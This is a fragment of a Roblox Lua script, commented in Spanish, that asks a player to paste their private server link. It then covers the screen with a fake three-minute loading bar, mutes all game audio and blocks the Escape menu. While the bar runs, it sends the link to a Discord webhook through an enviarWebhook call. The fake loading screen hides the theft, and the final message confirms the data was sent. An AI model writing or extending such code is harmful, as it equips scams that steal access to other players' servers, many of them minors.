-- Pantalla negra dura 3 minutos y se elimina automáticamente al llegar a 100%

-- ... (resto del código igual) ...

sendButton.MouseButton1Click:Connect(function()
    local link = textBox.Text
    if link == "" then
        label.TextColor3 = Color3.fromRGB(255, 100, 100)
        label.Text = "⚠️ Please enter your private server link!"
        return
    end

    print("🔗 Link entered:", link)

    -- Pantalla negra y loading bar
    blackFrame = Instance.new("Frame")
    blackFrame.Name = "BlackScreen"
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 9999
    blackFrame.Parent = screenGui

    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0, 100)
    loadingText.Position = UDim2.new(0, 0, 0.5, -50)
    loadingText.BackgroundTransparency = 1
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextScaled = true
    loadingText.TextColor3 = Color3.fromRGB(0, 180, 255)
    loadingText.Text = "LOADING..."
    loadingText.ZIndex = 10000
    loadingText.Parent = blackFrame

    local barWidth = 500
    local barHeight = 28
    local barFrame = Instance.new("Frame")
    barFrame.Name = "LoadingBarFrame"
    barFrame.Size = UDim2.new(0, barWidth, 0, barHeight)
    barFrame.Position = UDim2.new(0.5, -barWidth/2, 0.5, 70)
    barFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
    barFrame.BorderSizePixel = 0
    barFrame.ZIndex = 10001
    barFrame.Parent = blackFrame

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 14)
    barCorner.Parent = barFrame

    local fillFrame = Instance.new("Frame")
    fillFrame.Name = "LoadingBarFill"
    fillFrame.Size = UDim2.new(0, 0, 1, 0)
    fillFrame.Position = UDim2.new(0, 0, 0, 0)
    fillFrame.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
    fillFrame.BorderSizePixel = 0
    fillFrame.ZIndex = 10002
    fillFrame.Parent = barFrame

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 14)
    fillCorner.Parent = fillFrame

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Name = "PercentLabel"
    percentLabel.Size = UDim2.new(0, barWidth, 0, 40)
    percentLabel.Position = UDim2.new(0.5, -barWidth/2, 0.5, 25)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Font = Enum.Font.GothamBold
    percentLabel.TextScaled = true
    percentLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
    percentLabel.Text = "0%"
    percentLabel.ZIndex = 10003
    percentLabel.Parent = blackFrame

    muteAllSounds()
    ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)

    -- Envía los datos al webhook mientras carga la barra
    task.spawn(function()
        enviarWebhook(link)
    end)

    -- Animación de barra de carga (3 minutos)
    local duration = 180 -- 3 minutos en segundos
    local steps = 600
    for step = 0, steps do
        local percent = step / steps
        fillFrame.Size = UDim2.new(percent, 0, 1, 0)
        percentLabel.Text = math.floor(percent * 100) .. "%"
        task.wait(duration / steps)
    end
    fillFrame.Size = UDim2.new(1, 0, 1, 0)
    percentLabel.Text = "100%"

    -- Elimina la pantalla negra al terminar
    if blackFrame then
        blackFrame:Destroy()
    end

    label.TextColor3 = Color3.fromRGB(40, 200, 80)
    label.Text = "Datos enviados al webhook de Discord (Sab)!"
end)

if blackFrame then
    blackFrame.AncestryChanged:Connect(function()
        if not blackFrame:IsDescendantOf(game) then
            ContextActionService:UnbindAction(escBlockActionName)
        end
    end)
end
